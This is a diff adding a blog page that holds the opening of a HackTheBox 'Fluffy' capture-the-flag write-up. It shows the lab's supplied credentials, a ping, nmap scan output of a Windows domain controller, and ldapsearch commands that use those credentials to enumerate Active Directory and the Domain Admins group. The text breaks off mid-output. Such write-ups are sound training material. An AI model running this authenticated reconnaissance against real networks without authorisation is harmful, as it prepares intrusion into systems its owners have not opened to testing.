@@ -1,0 +1,1692 @@
+<!doctype html>
+<html
+  lang="en-us"
+  dir="ltr"
+  class="h-full">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta name="language" content="en-us">
+<script>
+  
+  (function () {
+    const storedTheme = localStorage.getItem("theme");
+    const systemPrefersLight = window.matchMedia("(prefers-color-scheme: light)").matches;
+    const theme = storedTheme || (systemPrefersLight ? "light" : "dark");
+    document.documentElement.setAttribute("data-theme", theme);
+  })();
+</script>
+<title>Fluffy | Bukhari&#39;s Archive</title>
+<meta
+  name="description"
+  content="
+    HackTheBox Fluffy machine writeup
+  
+  ">
+
+
+  <meta name="keywords" content="HackTheBox, Active Directory, SMB, NTLM, Privilege Escalation">
+
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/hackthebox/fluffy/">
+
+<meta name="robots" content="index, follow">
+
+
+<meta property="og:type" content="article">
+<meta property="og:title" content="Fluffy | Bukhari&#39;s Archive">
+<meta property="og:description" content="HackTheBox Fluffy machine writeup">
+<meta property="og:url" content="http://localhost:1313/hackthebox/fluffy/">
+<meta property="og:site_name" content="Bukhari&#39;s Archive"><meta property="og:image" content="http://localhost:1313/preview.png">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630"><meta property="article:published_time" content="2026-02-14T00:00:00Z">
+  <meta
+    property="article:modified_time"
+    content="2026-02-14T00:00:00Z"><meta property="article:section" content="HackTheBox"><meta property="article:tag" content="HackTheBox"><meta property="article:tag" content="Active Directory"><meta property="article:tag" content="SMB"><meta property="article:tag" content="NTLM"><meta property="article:tag" content="Privilege Escalation">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Fluffy | Bukhari&#39;s Archive">
+<meta name="twitter:description" content="HackTheBox Fluffy machine writeup"><meta name="twitter:image" content="http://localhost:1313/preview.png">
+
+<script type="application/ld+json">
+
+
+
+
+
+
+
+
+
+
+
+
+"{\"@context\":\"https://schema.org\",\"@type\":\"BlogPosting\",\"author\":{\"@type\":\"Person\",\"email\":\"yourmail@example.com\",\"name\":\"Bukhari's Archive\"},\"dateModified\":\"2026-02-14T00:00:00Z\",\"datePublished\":\"2026-02-14T00:00:00Z\",\"description\":\"HackTheBox Fluffy machine writeup\",\"headline\":\"Fluffy\",\"image\":\"http://localhost:1313/preview.png\",\"keywords\":[\"HackTheBox\",\"Active Directory\",\"SMB\",\"NTLM\",\"Privilege Escalation\"],\"mainEntityOfPage\":{\"@id\":\"http://localhost:1313/hackthebox/fluffy/\",\"@type\":\"WebPage\"},\"publisher\":{\"@type\":\"Organization\",\"logo\":{\"@type\":\"ImageObject\",\"url\":\"/images/avatar.png\"},\"name\":\"Bukhari's Archive\"}}"</script>
+
+
+
+  
+  
+  
+  
+<script type="application/ld+json">"{\"@context\":\"https://schema.org\",\"@type\":\"BreadcrumbList\",\"itemListElement\":[{\"@type\":\"ListItem\",\"item\":\"http://localhost:1313/\",\"name\":\"Bukhari's Archive\",\"position\":1},{\"@type\":\"ListItem\",\"item\":\"http://localhost:1313/hackthebox/fluffy/\",\"name\":\"Fluffy\",\"position\":2}]}"</script>
+
+
+
+
+
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link
+  href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&family=Outfit:wght@400;500;600;700;800;900&family=Space+Grotesk:wght@400;500;600;700&display=swap"
+  rel="stylesheet">
+
+
+<link
+  rel="stylesheet"
+  href="/css/theme.min.a251f6659747f13720004e758411b578202d6d8c8dd101f6d21a21fb1bb104b2.css"
+  integrity="sha256-olH2ZZdH8TcgAE51hBG1eCAtbYyN0QH20hoh&#43;xuxBLI=">
+
+<link
+    rel="stylesheet"
+    href="/css/syntax-dark.min.b01037e5609e6260b74d6fcdd6d5131e8dcbc4d46d6ef4bfbe5a60bdfc1a9f30.css"
+    integrity="sha256-sBA35WCeYmC3TW/N1tUTHo3LxNRtbvS/vlpgvfwanzA="
+    id="syntax-dark-theme"
+    class="syntax-theme"><link
+    rel="stylesheet"
+    href="/css/syntax-light.min.9602bc2fcef52b4c62e05eae14b48ba428e114f116e993e504d83ed5a3aeda98.css"
+    integrity="sha256-lgK8L871K0xi4F6uFLSLpCjhFPEW6ZPlBNg&#43;1aOu2pg="
+    id="syntax-light-theme"
+    class="syntax-theme"
+    disabled><script>
+  
+  (function () {
+    const storedTheme = localStorage.getItem("theme");
+    const systemPrefersLight = window.matchMedia("(prefers-color-scheme: light)").matches;
+    const theme = storedTheme || (systemPrefersLight ? "light" : "dark");
+
+    const syntaxDark = document.getElementById("syntax-dark-theme");
+    const syntaxLight = document.getElementById("syntax-light-theme");
+
+    if (theme === "light") {
+      if (syntaxDark) syntaxDark.disabled = true;
+      if (syntaxLight) syntaxLight.disabled = false;
+    } else {
+      if (syntaxDark) syntaxDark.disabled = false;
+      if (syntaxLight) syntaxLight.disabled = true;
+    }
+
+    
+    const observer = new MutationObserver(() => {
+      const currentTheme = document.documentElement.getAttribute("data-theme");
+      if (currentTheme === "light") {
+        if (syntaxDark) syntaxDark.disabled = true;
+        if (syntaxLight) syntaxLight.disabled = false;
+      } else {
+        if (syntaxDark) syntaxDark.disabled = false;
+        if (syntaxLight) syntaxLight.disabled = true;
+      }
+    });
+
+    observer.observe(document.documentElement, {
+      attributes: true,
+      attributeFilter: ["data-theme"],
+    });
+  })();
+</script>
+
+
+
+
+<link
+  rel="stylesheet"
+  href="/css/bundle.min.d430be27649a3685c7891f7076e3e50f97bf39aabb96c243b89902f3dc6c9ead.css"
+  integrity="sha256-1DC&#43;J2SaNoXHiR9wduPlD5e/Oaq7lsJDuJkC89xsnq0=">
+
+
+
+
+
+<link rel="icon" type="image/x-icon" href="/favicon.ico">
+<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico">
+
+<link rel="icon" type="image/png" href="/favicon.png">
+
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon/logo-transparent/favicon-32x32.png">
+
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon/logo-transparent/favicon-16x16.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/favicon/logo-transparent/apple-touch-icon.png">
+<link
+  rel="icon"
+  type="image/png"
+  sizes="192x192"
+  href="/favicon/logo-transparent/android-chrome-192x192.png">
+<link
+  rel="icon"
+  type="image/png"
+  sizes="512x512"
+  href="/favicon/logo-transparent/android-chrome-512x512.png">
+<link rel="manifest" href="/favicon/logo-transparent/site.webmanifest">
+
+
+
+
+  
+
+
+
+
+  </head>
+  <body class="flex flex-col min-h-screen">
+    <a href="#main-content" class="skip-to-main" aria-label="Skip to main content"
+      >Skip to main content</a
+    >
+    <header class="sticky-header">
+      <div class="header-container">
+        <nav class="header-nav" role="navigation" aria-label="Main navigation">
+  <div class="header-content">
+    <div class="header-logo">
+      <a href="/" class="logo-link" aria-label="Home - Bukhari&#39;s Archive">
+        Bukhari&#39;s Archive
+      </a>
+    </div>
+
+    
+    <button 
+      id="mobile-menu-toggle" 
+      class="mobile-menu-toggle" 
+      aria-label="Toggle menu" 
+      aria-expanded="false"
+      type="button">
+      <span class="hamburger-icon">
+        <span class="hamburger-line"></span>
+        <span class="hamburger-line"></span>
+        <span class="hamburger-line"></span>
+      </span>
+    </button>
+
+    <div class="header-menu">
+      <ul class="menu-list">
+  
+    <li class="menu-item">
+      <a
+        href="/"
+        class="menu-link ">
+        Home
+      </a>
+    </li>
+  
+    <li class="menu-item">
+      <a
+        href="/machines/"
+        class="menu-link ">
+        Machines
+      </a>
+    </li>
+  
+    <li class="menu-item">
+      <a
+        href="/ctf/"
+        class="menu-link ">
+        CTF
+      </a>
+    </li>
+  
+    <li class="menu-item">
+      <a
+        href="/tags/"
+        class="menu-link ">
+        Tags
+      </a>
+    </li>
+  
+    <li class="menu-item">
+      <a
+        href="/"
+        class="menu-link ">
+        About
+      </a>
+    </li>
+  
+</ul>
+
+
+      <button id="search-toggle" class="search-toggle" aria-label="Search" type="button">
+        <svg class="search-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path
+            stroke-linecap="round"
+            stroke-linejoin="round"
+            stroke-width="2"
+            d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
+        </svg>
+      </button>
+
+      <button id="theme-toggle" class="theme-toggle" aria-label="Toggle theme" type="button">
+  <svg class="icon-sun" fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+    <path
+      stroke-linecap="round"
+      stroke-linejoin="round"
+      stroke-width="2"
+      d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path>
+  </svg>
+  <svg class="icon-moon" fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+    <path
+      stroke-linecap="round"
+      stroke-linejoin="round"
+      stroke-width="2"
+      d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path>
+  </svg>
+</button>
+
+    </div>
+  </div>
+
+  
+  <div id="mobile-menu" class="mobile-menu" aria-hidden="true">
+    <div class="mobile-menu-overlay"></div>
+    <div class="mobile-menu-content">
+      <div class="mobile-menu-header">
+        <span class="mobile-menu-title">Menu</span>
+        <button 
+          id="mobile-menu-close" 
+          class="mobile-menu-close" 
+          aria-label="Close menu" 
+          type="button">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+          </svg>
+        </button>
+      </div>
+      <nav class="mobile-menu-nav" role="navigation" aria-label="Mobile navigation">
+        <ul class="menu-list">
+  
+    <li class="menu-item">
+      <a
+        href="/"
+        class="menu-link ">
+        Home
+      </a>
+    </li>
+  
+    <li class="menu-item">
+      <a
+        href="/machines/"
+        class="menu-link ">
+        Machines
+      </a>
+    </li>
+  
+    <li class="menu-item">
+      <a
+        href="/ctf/"
+        class="menu-link ">
+        CTF
+      </a>
+    </li>
+  
+    <li class="menu-item">
+      <a
+        href="/tags/"
+        class="menu-link ">
+        Tags
+      </a>
+    </li>
+  
+    <li class="menu-item">
+      <a
+        href="/"
+        class="menu-link ">
+        About
+      </a>
+    </li>
+  
+</ul>
+
+      </nav>
+      <div class="mobile-menu-footer">
+        <button id="mobile-search-toggle" class="mobile-search-toggle" aria-label="Search" type="button">
+          <svg class="search-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path
+              stroke-linecap="round"
+              stroke-linejoin="round"
+              stroke-width="2"
+              d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
+          </svg>
+          <span>Search</span>
+        </button>
+        <button class="theme-toggle" aria-label="Toggle theme" type="button">
+          <svg class="icon-sun" fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+            <path
+              stroke-linecap="round"
+              stroke-linejoin="round"
+              stroke-width="2"
+              d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path>
+          </svg>
+          <svg class="icon-moon" fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+            <path
+              stroke-linecap="round"
+              stroke-linejoin="round"
+              stroke-width="2"
+              d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path>
+          </svg>
+        </button>
+      </div>
+    </div>
+  </div>
+</nav>
+
+      </div>
+    </header>
+
+    <main id="main-content" class="flex-1" role="main">
+      
+  <div class="single-post-wrapper">
+    <article class="single-post">
+      
+
+
+
+
+  <div class="post-image-single">
+    <img
+      src="/preview.png"
+      alt="
+        HackTheBox Fluffy machine writeup
+      "
+      loading="eager"
+      width="1200"
+      height="630">
+  </div>
+
+
+
+
+      <header class="post-header">
+        <h1 class="post-title-main">Fluffy</h1>
+
+        
+          <p class="post-description-main">HackTheBox Fluffy machine writeup</p>
+        
+
+        <div class="post-meta">
+  <div class="post-meta-info">
+    <time datetime="2026-02-14T00:00:00Z" class="post-date">
+      <svg class="meta-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+        <path
+          stroke-linecap="round"
+          stroke-linejoin="round"
+          stroke-width="2"
+          d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path>
+      </svg>
+      February 14, 2026
+    </time>
+
+    <span class="meta-separator">•</span>
+
+    
+      <span class="post-word-count">
+        <svg class="meta-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path
+            stroke-linecap="round"
+            stroke-linejoin="round"
+            stroke-width="2"
+            d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
+        </svg>
+        4631 words
+      </span>
+    
+
+    
+      <span class="meta-separator">•</span>
+      <span class="post-reading-time">
+        <svg class="meta-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path
+            stroke-linecap="round"
+            stroke-linejoin="round"
+            stroke-width="2"
+            d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+        </svg>
+        22 min
+      </span>
+    
+  </div>
+
+  
+    <div class="post-tags">
+      
+        <a href="/tags/hackthebox" class="post-tag">HackTheBox</a>
+      
+        <a href="/tags/active-directory" class="post-tag">Active Directory</a>
+      
+        <a href="/tags/smb" class="post-tag">SMB</a>
+      
+        <a href="/tags/ntlm" class="post-tag">NTLM</a>
+      
+        <a href="/tags/privilege-escalation" class="post-tag">Privilege Escalation</a>
+      
+    </div>
+  
+</div>
+
+      </header>
+
+      <div class="post-content-main">
+        <h1 id="fluffy">Fluffy</h1>
+<figure><img src="Fluffy.png"
+    alt="Fluffy" width="600">
+</figure>
+
+<!-- raw HTML omitted -->
+<table>
+  <thead>
+      <tr>
+          <th><strong>Target IP</strong></th>
+          <th><strong>Username</strong></th>
+          <th><strong>Password</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>10.10.11.69</td>
+          <td>j.fleischman</td>
+          <td>J0elTHEM4n1990!</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="pinging">Pinging</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ping 10.10.11.69          
+</span></span><span class="line"><span class="cl">PING 10.10.11.69 <span class="o">(</span>10.10.11.69<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 10.10.11.69: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">1</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">127</span> <span class="nv">time</span><span class="o">=</span><span class="m">1180</span> ms
+</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 10.10.11.69: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">2</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">127</span> <span class="nv">time</span><span class="o">=</span><span class="m">702</span> ms
+</span></span><span class="line"><span class="cl">^C
+</span></span><span class="line"><span class="cl">--- 10.10.11.69 ping statistics ---
+</span></span><span class="line"><span class="cl"><span class="m">3</span> packets transmitted, <span class="m">2</span> received, 33.3333% packet loss, <span class="nb">time</span> 2003ms
+</span></span><span class="line"><span class="cl">rtt min/avg/max/mdev <span class="o">=</span> 702.133/941.099/1180.065/238.966 ms, pipe <span class="m">2</span>
+</span></span></code></pre></div><p>The target machine is accessible.</p>
+<h2 id="nmap">Nmap</h2>
+<p>To check open ports</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">                                                                                                                                        
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nmap -sV -sC 10.10.11.69
+</span></span><span class="line"><span class="cl">Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-07-07 04:39 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.69
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>2.7s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">989</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE               VERSION
+</span></span><span class="line"><span class="cl">53/tcp   open  domain                Simple DNS Plus
+</span></span><span class="line"><span class="cl">88/tcp   open  kerberos-sec          Microsoft Windows Kerberos <span class="o">(</span>server time: 2025-07-07 15:23:45Z<span class="o">)</span>
+</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn?
+</span></span><span class="line"><span class="cl">389/tcp  open  ldap                  Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: fluffy.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2025-07-07T15:26:42+00:00<span class="p">;</span> +6h37m37s from scanner time.
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC01.fluffy.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2025-04-17T16:04:17
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2026-04-17T16:04:17
+</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds?
+</span></span><span class="line"><span class="cl">464/tcp  open  kpasswd5?
+</span></span><span class="line"><span class="cl">593/tcp  open  ncacn_http            Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp  open  ssl/ldap              Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: fluffy.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC01.fluffy.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2025-04-17T16:04:17
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2026-04-17T16:04:17
+</span></span><span class="line"><span class="cl">3268/tcp open  ldap                  Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: fluffy.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC01.fluffy.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2025-04-17T16:04:17
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2026-04-17T16:04:17
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2025-07-07T15:26:39+00:00<span class="p">;</span> +6h37m37s from scanner time.
+</span></span><span class="line"><span class="cl">3269/tcp open  ssl/globalcatLDAPssl?
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC01.fluffy.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2025-04-17T16:04:17
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2026-04-17T16:04:17
+</span></span><span class="line"><span class="cl">5985/tcp open  http                  Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl"><span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span class="line"><span class="cl">SF-Port139-TCP:V<span class="o">=</span>7.95%I<span class="o">=</span>7%D<span class="o">=</span>7/7%Time<span class="o">=</span>686B894B%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>GetR
+</span></span><span class="line"><span class="cl">SF:equest,5,<span class="s2">&#34;\x83\0\0\x01\x8f&#34;</span><span class="o">)</span>%r<span class="o">(</span>GenericLines,5,<span class="s2">&#34;\x83\0\0\x01\x8f&#34;</span><span class="o">)</span>%r<span class="o">(</span>HTT
+</span></span><span class="line"><span class="cl">SF:POptions,5,<span class="s2">&#34;\x83\0\0\x01\x8f&#34;</span><span class="o">)</span>%r<span class="o">(</span>RTSPRequest,5,<span class="s2">&#34;\x83\0\0\x01\x8f&#34;</span><span class="o">)</span>%r<span class="o">(</span>RP
+</span></span><span class="line"><span class="cl">SF:CCheck,5,<span class="s2">&#34;\x83\0\0\x01\x8f&#34;</span><span class="o">)</span>%r<span class="o">(</span>DNSVersionBindReqTCP,5,<span class="s2">&#34;\x83\0\0\x01\x8f
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:&#34;</span><span class="o">)</span>%r<span class="o">(</span>DNSStatusRequestTCP,5,<span class="s2">&#34;\x83\0\0\x01\x8f&#34;</span><span class="o">)</span>%r<span class="o">(</span>Help,5,<span class="s2">&#34;\x83\0\0\x01\x
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:8f&#34;</span><span class="o">)</span>%r<span class="o">(</span>SSLSessionReq,5,<span class="s2">&#34;\x83\0\0\x01\x8f&#34;</span><span class="o">)</span>%r<span class="o">(</span>TerminalServerCookie,5,<span class="s2">&#34;\x
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:83\0\0\x01\x8f&#34;</span><span class="o">)</span>%r<span class="o">(</span>TLSSessionReq,5,<span class="s2">&#34;\x83\0\0\x01\x8f&#34;</span><span class="o">)</span>%r<span class="o">(</span>Kerberos,5,<span class="s2">&#34;\x
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:83\0\0\x01\x8f&#34;</span><span class="o">)</span>%r<span class="o">(</span>X11Probe,5,<span class="s2">&#34;\x83\0\0\x01\x8f&#34;</span><span class="o">)</span>%r<span class="o">(</span>FourOhFourRequest,5
+</span></span><span class="line"><span class="cl">SF:,<span class="s2">&#34;\x83\0\0\x01\x8f&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">Service Info: Host: DC01<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   date:I 2025-07-07T15:25:49
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: 6h37m35s, deviation: 0s, median: 6h37m35s
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   3:1:1: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 598.54 seconds                               
+</span></span></code></pre></div><p>The result shows the target has 11 open <a href="http://ports.So">ports.</a> Ignoring port 53 I’ll check the rest of the ports</p>
+<p>To look up the findings of nmap I first have to add the machine&rsquo;s domain name (from the certificate)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo nano /etc/hosts
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> kali: 
+</span></span></code></pre></div><figure><img src="image.png"
+    alt="Fluffy" width="800">
+</figure>
+
+<p><code>10.10.11.69    DC01.fluffy.htb fluffy.htb</code></p>
+<p>I searched for <code>DC01.fluffy.htb</code> but got to nowhere then I searched to <code>fluffy.htb</code></p>
+<p>Both didn’t worked then i gave a look to the nmap result an noticed that it is an active directory and the machine gave creds i.e.</p>
+<p>Then I tried to access the <code>Active Directory</code> using these provided Creds</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">                                                                                                                             
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ldapsearch -x -H ldap://10.10.11.69 -D <span class="s2">&#34;j.fleischman@fluffy.htb&#34;</span> -w <span class="s1">&#39;J0elTHEM4n1990!&#39;</span> -b <span class="s2">&#34;dc=fluffy,dc=htb&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># extended LDIF</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># LDAPv3</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># base &lt;dc=fluffy,dc=htb&gt; with scope subtree</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># filter: (objectclass=*)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># requesting: ALL</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span></code></pre></div><p>This gave the meta data of the <code>Active Directory</code> .</p>
+<p>And then i looked for Domain admins</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ldapsearch -x -H ldap://10.10.11.69 -D <span class="s1">&#39;j.fleischman@fluffy.htb&#39;</span> -w <span class="s1">&#39;J0elTHEM4n1990!&#39;</span> -b <span class="s2">&#34;dc=fluffy,dc=htb&#34;</span> <span class="s2">&#34;(cn=Domain Admins)&#34;</span> member
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># extended LDIF</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># LDAPv3</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># base &lt;dc=fluffy,dc=htb&gt; with scope subtree</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># filter: (cn=Domain Admins)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># requesting: member </span>
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Domain Admins, Users, fluffy.htb</span>
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>Domain Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>fluffy,DC<span class="o">=</span>htb
+</span></span><span class="line"><span class="cl">member: <span class="nv">CN</span><span class="o">=</span>Administrator,CN<span class="o">=</span>Users,DC<span class="o">=</span>fluffy,DC<span class="o">=</span>htb
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># search reference</span>
+</span></span><span class="line"><span class="cl">ref: ldap://ForestDnsZones.fluffy.htb/DC<span class="o">=</span>ForestDnsZones,DC<span class="o">=</span>fluffy,DC<span class="o">=</span>htb
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># search reference</span>
+</span></span><span class="line"><span class="cl">ref: ldap://DomainDnsZones.fluffy.htb/DC<span class="o">=</span>DomainDnsZones,DC<span class="o">=</span>fluffy,DC<span class="o">=</span>htb
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># search reference</span>
+</span></span><span class="line"><span class="cl">ref: ldap://fluffy.htb/CN<span class="o">=</span>Configuration,DC<span class="o">=</span>fluffy,DC<span class="o">=</span>htb
+</span></span><span class="line"><span class="cl">
